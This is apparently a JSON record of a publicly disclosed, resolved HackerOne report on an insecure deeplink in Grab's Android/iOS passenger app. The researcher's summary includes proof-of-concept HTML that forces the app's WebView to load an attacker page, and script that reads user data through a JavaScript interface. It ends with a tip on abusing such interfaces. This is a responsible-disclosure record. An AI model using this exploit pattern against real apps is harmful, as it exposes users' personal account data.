{
  "id": 401793,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDE3OTM=",
  "url": "https://hackerone.com/reports/401793",
  "title": "[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-08-28T18:36:14.863Z",
  "submitted_at": "2018-08-28T18:36:14.863Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bagipro",
    "url": "/bagipro",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1659,
    "url": "https://hackerone.com/grab",
    "handle": "grab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Grab",
      "twitter_handle": "GrabSG",
      "website": "https://grab.com",
      "about": "Grab is Southeast Asia's #1 ride-hailing app, food delivery service and cashless payment solution."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-03-15T23:41:10.132Z",
  "bug_reporter_agreed_on_going_public_at": "2019-03-15T23:41:10.029Z",
  "team_member_agreed_on_going_public_at": "2019-03-15T23:37:20.689Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 537,
  "voters": [
    "notpwnguy",
    "pajoda",
    "hexpwn",
    "pmnh",
    "skyw1per",
    "yuyudhn",
    "orange303",
    "pineapplesoup",
    "alphaaquila",
    "hakuna",
    "and 527 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 1684,
    "asset_type": "GOOGLE_PLAY_APP_ID",
    "asset_identifier": "com.grabtaxi.passenger",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 14616,
      "category": "team",
      "content": "A deeplink feature was found missing validation that led to sensitive information disclosure. Once triggered, the deeplink would direct users to load any attacker-controlled URL within a webview. The impact was further escalated as the webview contain sensitive information. A temporary patch was distributed shortly after the submission was verified and a permanent patch was released and completely rolled out soon after. \n\nGrab appreciate @bagipro's contribution to our bug bounty program, @bagipro displayed strong mobile offensive security skills and detailed report which allowed us to quickly reproduce and validate the submission. As a mobile-first company, mobile security is our utmost focus, Grab look forward to seeing more of his creative bug reports to our program.\n",
      "updated_at": "2019-03-15T03:28:01.343Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 294052,
        "username": "zuentj",
        "name": "zuentj",
        "bio": "Security Janitor",
        "cleared": false,
        "verified": false,
        "website": "https://www.grab.com",
        "location": "",
        "created_at": "2018-06-19T03:05:38.964Z",
        "url": "https://hackerone.com/zuentj",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "id": 11062,
      "category": "researcher",
      "content": "I've found a set of possible deeplinks, one of them (``` HELPCENTER ```) could lead that an arbtrary URL was opened in a built-in browser in activity ``` com.grab.pax.support.ZendeskSupportActivity ``` using that code (should be used in an external browser/messenger)\n```html\n<!DOCTYPE html>\n<html>\n<head><title>Page 1</title></head>\n<body style=\"text-align: center;\">\n    <h1><a href=\"grab://open?screenType=HELPCENTER&amp;page=https://s3.amazonaws.com/edited/page2.html\">Begin attack!</a></h1>\n</body>\n</html>\n```\nBut the WebView had an interesting setting\n```java\n        mWebView.addJavascriptInterface(new com.grab.pax.support.ZendeskSupportActivity.WebAppInterface(this), \"Android\");\n```\nwith method\n```java\n        @android.webkit.JavascriptInterface\n        public final java.lang.String getGrabUser() {\n            //...\n            return com.grab.base.p167l.GsonUtils.m7210a(zendeskSupportActivity.getMPresenter().getGrabUser());\n        }\n```\n\nI tested my code which forced Grab Passenger app to load ``` https://s3.amazonaws.com/edited/page2.html ``` page with HTML\n```html\n<!DOCTYPE html>\n<html>\n<head><title>Page 2</title></head>\n<body style=\"text-align: center;\">\n    <script type=\"text/javascript\">\n        var data;\n        if(window.Android) { // Android\n            data = window.Android.getGrabUser();\n        }\n        else if(window.grabUser) { // iOS\n            data = JSON.stringify(window.grabUser);\n        }\n\n        if(data) {\n            document.write(\"Stolen data: \" + data);\n        }\n    </script>\n</body>\n</html>\n```\n\nI didn't reverse iOS app, but only opened https://help.grab.com/, grepped for ``` getGrabUser ``` and found\n```js\n    public static initGrabUser() {\n        if (Utils.Condition.isIOSApp()) {\n            Stores.GrabUser.setGrabUser(window.grabUser);\n        }\n\n        if (Utils.Condition.isAndroidApp()) {\n            Stores.GrabUser.setGrabUser(JSON.parse(Android.getGrabUser()));\n        }\n    }\n```\nIt helped me to realize how to exploit iOS too :)\n\nTips: JS interfaces (on both platforms) have no origin policies, so if you have the ability to make an Open Redirect or XSS (i.e. run your own JS in the given WebView), it means you can access them!",
      "updated_at": "2025-04-09T11:22:32.637Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 52239,
        "username": "bagipro",
        "name": "Sergey Toshin",
        "bio": "",
        "cleared": false,
        "verified": true,
        "website": "https://oversecured.com/",
        "location": "",
        "created_at": "2016-01-21T22:43:16.784Z",
        "url": "https://hackerone.com/bagipro",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
        }
      }
    }
  ]
}
